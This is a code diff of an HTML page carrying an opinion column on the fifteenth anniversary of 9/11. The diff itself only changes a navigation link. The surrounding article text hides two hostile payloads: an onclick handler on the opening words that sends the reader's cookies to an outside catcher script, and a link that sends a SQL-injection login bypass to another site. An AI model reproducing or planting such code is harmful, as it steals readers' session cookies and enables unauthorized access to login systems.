@@ -19,7 +19,7 @@
 
 <p class="details">Written by Tavleen Singh |September 11, 2016 1:54 am <a href="#"></a> </p>
 <h2 align="right"><a href="20160910-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160912-opinion.php"> Next </a> </h2>
 <p>
 <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Fifteen years ago </a> today the world changed forever. The boundaries between war and peace disappeared as a cowardly new kind of warfare manifested itself in the 9/11 attacks and a horrible new ideology was born. It is an ideology that continues to haunt us every time there is a new act of jihadi terrorism, and because the rules of war have changed completely, no leader of the ‘civilised’ world has so far been able to come up with an effective strategy to defeat jihadi Islam. It is possible that before very long we will see the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  Islamic State destroyed,</a> but the ideology that is the reason why the caliphate was founded continues to have an allure that is disturbingly powerful.
 </p> <p>
